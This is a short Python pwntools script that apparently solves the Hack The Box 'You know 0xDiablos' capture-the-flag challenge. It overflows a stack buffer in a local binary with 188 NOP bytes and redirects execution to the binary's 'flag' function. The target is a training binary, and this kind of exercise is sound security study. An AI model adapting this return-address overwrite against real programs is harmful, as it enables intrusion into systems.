from pwn import *

filename = "/root/Escritorio/BOF/TryHarder/X4v1l0k/HTB_You_know_0xDiablos/vuln"

e = ELF(filename)
context.update(arch='i386')
#context.log_level = 'DEBUG'

p = process(filename)

p.recvline()

offset = 188

eip = p32(e.symbols['flag'])

payload = "\x90" * offset + eip

p.sendline(payload)

print(p.recvall())